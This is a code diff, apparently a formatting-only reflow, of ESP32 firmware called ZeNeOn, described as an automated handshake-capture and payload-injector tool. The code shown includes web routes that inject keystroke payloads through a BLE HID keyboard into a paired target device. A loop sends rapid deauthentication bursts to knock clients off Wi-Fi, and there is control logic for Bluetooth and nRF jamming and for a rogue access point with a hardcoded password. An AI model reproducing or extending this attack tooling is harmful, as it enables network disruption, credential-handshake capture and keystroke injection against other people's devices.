@@ -3042,7 +3182,8 @@ void setupRoutes() {
     payloadStatus = "idle";
     payloadExecuting = false;
     payloadBuffer = "";
-    String resp = "{\"ok\":true,\"msg\":\"Disconnected — re-advertising as '" + bleDeviceName + "'\"}";
+    String resp = "{\"ok\":true,\"msg\":\"Disconnected — re-advertising as '" +
+                  bleDeviceName + "'\"}";
     server.send(200, "application/json", resp);
   });
 
@@ -3053,11 +3194,12 @@ void setupRoutes() {
     if (bleKbStarted) {
       bleKeyboard.releaseAll();
       bleKbStarted = false;
-      // DO NOT call bleKeyboard.end() or clearBLEBonds() — keeps NimBLE stack + bond data alive
-      // bleNimbleReady stays TRUE so next /payload/start reuses the saved bond without mismatch
-      // Restore WiFi performance
+      // DO NOT call bleKeyboard.end() or clearBLEBonds() — keeps NimBLE stack +
+      // bond data alive bleNimbleReady stays TRUE so next /payload/start reuses
+      // the saved bond without mismatch Restore WiFi performance
       esp_wifi_set_ps(WIFI_PS_NONE);
-      Serial.println("[PAYLOAD] BLE Keyboard stopped — NimBLE stack + bond kept alive for next start");
+      Serial.println("[PAYLOAD] BLE Keyboard stopped — NimBLE stack + bond "
+                     "kept alive for next start");
       addEvent("PAYLOAD: BLE Keyboard stopped (bond preserved)");
     }
     server.send(200, "text/plain", "BLE Keyboard stopped");
@@ -3075,7 +3217,8 @@ void setupRoutes() {
     String json = "{";
     json += "\"started\":" + String(bleKbStarted ? "true" : "false") + ",";
     json += "\"connected\":" + String(isConn ? "true" : "false") + ",";
-    json += "\"executing\":" + String(payloadExecuting ? "true" : "false") + ",";
+    json +=
+        "\"executing\":" + String(payloadExecuting ? "true" : "false") + ",";
     json += "\"linesExec\":" + String(payloadLinesExecuted) + ",";
     json += "\"totalLines\":" + String(payloadTotalLines) + ",";
     json += "\"status\":\"" + payloadStatus + "\"";
@@ -3085,24 +3228,31 @@ void setupRoutes() {
 
   server.on("/payload/inject", HTTP_POST, []() {
     if (!bleKbStarted) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Start BLE Keyboard first\"}");
+      server.send(200, "application/json",
+                  "{\"ok\":false,\"msg\":\"Start BLE Keyboard first\"}");
       return;
     }
     if (!bleKeyboard.isConnected()) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"No device paired — pair target device with ZeNeOn first\"}");
+      server.send(200, "application/json",
+                  "{\"ok\":false,\"msg\":\"No device paired — pair target "
+                  "device with ZeNeOn first\"}");
       return;
     }
     if (payloadExecuting) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Payload already executing — abort first\"}");
+      server.send(
+          200, "application/json",
+          "{\"ok\":false,\"msg\":\"Payload already executing — abort first\"}");
       return;
     }
     String pl = server.arg("payload");
     if (pl.length() == 0) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Empty payload\"}");
+      server.send(200, "application/json",
+                  "{\"ok\":false,\"msg\":\"Empty payload\"}");
       return;
     }
     if (pl.length() > 8192) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Payload too large (max 8KB)\"}");
+      server.send(200, "application/json",
+                  "{\"ok\":false,\"msg\":\"Payload too large (max 8KB)\"}");
       return;
     }
     payloadBuffer = pl;
@@ -3114,9 +3264,11 @@ void setupRoutes() {
     payloadExecuting = true;
     payloadStatus = "running";
     lastPayloadLine = "";
-    Serial.printf("[PAYLOAD] Executing %d lines (%d bytes)\n", payloadTotalLines, pl.length());
+    Serial.printf("[PAYLOAD] Executing %d lines (%d bytes)\n",
+                  payloadTotalLines, pl.length());
     addEvent("PAYLOAD: Executing " + String(payloadTotalLines) + " lines");
-    server.send(200, "application/json", "{\"ok\":true,\"lines\":" + String(payloadTotalLines) + "}");
+    server.send(200, "application/json",
+                "{\"ok\":true,\"lines\":" + String(payloadTotalLines) + "}");
   });
 
   server.on("/payload/abort", []() {
@@ -3131,21 +3283,27 @@ void setupRoutes() {
 
   /* --- Stop everything --- */
   server.on("/stop", []() {
-    bool wasActive = sniffing || deauthing || spamming || btJamming || nrfJamming || payloadExecuting || capturingHandshake ||
+    bool wasActive = sniffing || deauthing || spamming || btJamming ||
+                     nrfJamming || payloadExecuting || capturingHandshake ||
                      currentPhase != PHASE_IDLE;
     if (btJamming) {
       btJamming = false;
-      if (btInitialized) { esp_ble_gap_stop_advertising(); btJamDeinit(); }
+      if (btInitialized) {
+        esp_ble_gap_stop_advertising();
+        btJamDeinit();
+      }
     }
     if (nrfJamming) {
       nrfJamming = false;
-      if (nrfReady) nrfJamDeinit();
+      if (nrfReady)
+        nrfJamDeinit();
     }
     if (payloadExecuting) {
       payloadExecuting = false;
       payloadBuffer = "";
       payloadStatus = "aborted";
-      if (bleKbStarted) bleKeyboard.releaseAll();
+      if (bleKbStarted)
+        bleKeyboard.releaseAll();
     }
     // Stop BLE keyboard if running
     if (bleKbStarted) {
@@ -3213,7 +3371,8 @@ void setup() {
   Serial.begin(115200);
   delay(500);
   Serial.println("\n====================================================");
-  Serial.println("  ZeNeOn v5.2 — Automated Handshake Capture + Payload Injector");
+  Serial.println(
+      "  ZeNeOn v5.2 — Automated Handshake Capture + Payload Injector");
   Serial.println("  Made by MoOdY");
   Serial.println("====================================================\n");
   if (!SPIFFS.begin(true))
@@ -3237,19 +3396,21 @@ void setup() {
   // WiFi event handler for diagnostics and auto-recovery
   WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
     switch (event) {
-      case ARDUINO_EVENT_WIFI_AP_STACONNECTED:
-        Serial.printf("[WiFi] Client connected (total: %d)\n", WiFi.softAPgetStationNum());
-        break;
-      case ARDUINO_EVENT_WIFI_AP_STADISCONNECTED:
-        Serial.printf("[WiFi] Client disconnected (remaining: %d)\n", WiFi.softAPgetStationNum());
-        break;
-      case ARDUINO_EVENT_WIFI_AP_STOP:
-        Serial.println("[WiFi] WARNING: AP stopped unexpectedly!");
-        // Flag for recovery in loop()
-        apRecoveryInProgress = true;
-        break;
-      default:
-        break;
+    case ARDUINO_EVENT_WIFI_AP_STACONNECTED:
+      Serial.printf("[WiFi] Client connected (total: %d)\n",
+                    WiFi.softAPgetStationNum());
+      break;
+    case ARDUINO_EVENT_WIFI_AP_STADISCONNECTED:
+      Serial.printf("[WiFi] Client disconnected (remaining: %d)\n",
+                    WiFi.softAPgetStationNum());
+      break;
+    case ARDUINO_EVENT_WIFI_AP_STOP:
+      Serial.println("[WiFi] WARNING: AP stopped unexpectedly!");
+      // Flag for recovery in loop()
+      apRecoveryInProgress = true;
+      break;
+    default:
+      break;
     }
   });
 
@@ -3272,22 +3433,24 @@ void restartWiFiAP() {
   delay(300);
   WiFi.mode(WIFI_AP_STA);
   delay(100);
-  
+
   // Determine channel — use target channel during active attack, else ch1
-  int ch = (currentPhase != PHASE_IDLE && targetChannel > 0) ? targetChannel : 1;
+  int ch =
+      (currentPhase != PHASE_IDLE && targetChannel > 0) ? targetChannel : 1;
   WiFi.softAP("ZeNeOn", "88881234", ch);
   delay(300);
   WiFi.softAPmacAddress(ownAPMAC);
   dnsServer.stop();
   dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
-  
+
   esp_wifi_set_ps(bleKbStarted ? WIFI_PS_MIN_MODEM : WIFI_PS_NONE);
   esp_wifi_set_max_tx_power(84);
-  
+
   apRestartCount++;
   apRecoveryInProgress = false;
-  Serial.printf("[WiFi] AP restored on CH%d | IP: %s (restart #%lu, heap: %u)\n",
-                ch, WiFi.softAPIP().toString().c_str(), apRestartCount, ESP.getFreeHeap());
+  Serial.printf(
+      "[WiFi] AP restored on CH%d | IP: %s (restart #%lu, heap: %u)\n", ch,
+      WiFi.softAPIP().toString().c_str(), apRestartCount, ESP.getFreeHeap());
   addEvent("WiFi AP auto-recovered (restart #" + String(apRestartCount) + ")");
 }
 
@@ -3317,9 +3480,11 @@ void loop() {
     lastHeapLog = now;
     uint32_t freeHeap = ESP.getFreeHeap();
     if (freeHeap < 20000) {
-      Serial.printf("[WARN] Low heap: %u bytes — WiFi may become unstable!\n", freeHeap);
+      Serial.printf("[WARN] Low heap: %u bytes — WiFi may become unstable!\n",
+                    freeHeap);
       // If heap is critically low and nothing active, try to free memory
-      if (freeHeap < 10000 && !payloadExecuting && !sniffing && !deauthing && !btJamming) {
+      if (freeHeap < 10000 && !payloadExecuting && !sniffing && !deauthing &&
+          !btJamming) {
         Serial.println("[WARN] Critical heap — clearing buffers");
         payloadBuffer = "";
       }
@@ -3355,7 +3520,8 @@ void loop() {
 
   case PHASE_DEAUTH_BURST: {
     // Phase 2: Aggressive deauth burst at 8ms interval
-    // Faster interval = more deauth frames = higher chance of disconnecting clients
+    // Faster interval = more deauth frames = higher chance of disconnecting
+    // clients
     if (now - lastDeauth >= 8) {
       sendDeauthBurst();
       lastDeauth = now;
@@ -3522,7 +3688,8 @@ void loop() {
   }
 
   /* ---- PAYLOAD INJECTOR (BLE HID KEYBOARD) ---- */
-  // Track BLE connection state changes + anti-bounce reconnection loop detection
+  // Track BLE connection state changes + anti-bounce reconnection loop
+  // detection
   if (bleKbStarted) {
     bool currentlyConnected = bleKeyboard.isConnected();
     if (currentlyConnected && !bleWasConnected) {
@@ -3539,8 +3706,10 @@ void loop() {
       }
       if (bleReconnectCount >= BLE_MAX_RECONNECTS) {
         // Reconnection loop detected! Clear bonds and restart advertising
-        Serial.printf("[BLE] RECONNECTION LOOP DETECTED (%d connects in %lus) — auto-fixing\n",
-                       bleReconnectCount, (now - bleReconnectWindowStart) / 1000);
+        Serial.printf("[BLE] RECONNECTION LOOP DETECTED (%d connects in %lus) "
+                      "— auto-fixing\n",
+                      bleReconnectCount,
+                      (now - bleReconnectWindowStart) / 1000);
         addEvent("BLE: Reconnect loop detected — auto-fixing");
         bleCleanRestart();
         // bleCleanRestart resets bleWasConnected and counters
@@ -3566,8 +3735,10 @@ void loop() {
         payloadExecuting = false;
         payloadStatus = "done";
         bleKeyboard.releaseAll();
-        Serial.printf("[PAYLOAD] Complete — %d lines executed\n", payloadLinesExecuted);
-        addEvent("PAYLOAD: ★ COMPLETE — " + String(payloadLinesExecuted) + " lines executed");
+        Serial.printf("[PAYLOAD] Complete — %d lines executed\n",
+                      payloadLinesExecuted);
+        addEvent("PAYLOAD: ★ COMPLETE — " + String(payloadLinesExecuted) +
+                 " lines executed");
       } else {
         executeLine(line);
         payloadLinesExecuted++;
@@ -3577,7 +3748,8 @@ void loop() {
     // Device disconnected — give grace period for reconnection
     if (bleDisconnectTime == 0) {
       bleDisconnectTime = now;
-      Serial.println("[PAYLOAD] Device disconnected — waiting for reconnection...");
+      Serial.println(
+          "[PAYLOAD] Device disconnected — waiting for reconnection...");
       addEvent("PAYLOAD: Waiting for reconnection...");
     } else if (now - bleDisconnectTime >= BLE_RECONNECT_GRACE_MS) {
       // Grace period expired
